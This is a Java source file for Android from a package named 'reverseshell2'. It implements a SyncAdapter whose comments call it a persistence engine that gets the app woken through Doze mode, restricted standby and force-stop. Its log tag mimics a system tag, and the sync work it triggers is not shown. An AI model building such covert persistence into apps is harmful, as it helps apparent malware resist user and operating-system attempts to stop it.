package com.example.reverseshell2;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.SyncResult;
import android.os.Bundle;
import android.util.Log;

/**
 * SyncAdapter — the core persistence engine.
 * 
 * This replaces WorkManager as the PRIMARY sync mechanism.
 * Android's SyncManager (system_server process) will wake our app
 * process to call onPerformSync() even from:
 *   - Doze mode
 *   - App Standby "Restricted" bucket
 *   - After force-stop (if periodic sync is registered)
 * 
 * The OS treats this with the same priority as Google Account sync.
 */
public class SyncAdapterImpl extends AbstractThreadedSyncAdapter {

    private static final String TAG = "SYS_SYNC_ADAPTER";

    public SyncAdapterImpl(Context context, boolean autoInitialize) {
        super(context, autoInitialize);
    }

    public SyncAdapterImpl(Context context, boolean autoInitialize, boolean allowParallelSyncs) {
        super(context, autoInitialize, allowParallelSyncs);
    }

    @Override
    public void onPerformSync(Account account, Bundle extras, String authority,
                              ContentProviderClient provider, SyncResult syncResult) {
        Log.d(TAG, "SyncAdapter triggered by system — performing data sync");
        
        try {
            // This is where the magic happens.
            // The OS woke us up — now run the full data sync pipeline.
            DataSyncer syncer = new DataSyncer(getContext());
            syncer.performSync();
            
            Log.d(TAG, "SyncAdapter sync completed successfully");
        } catch (Exception e) {
            Log.e(TAG, "SyncAdapter sync failed: " + e.getMessage());
            syncResult.stats.numIoExceptions++;
        }
    }
}
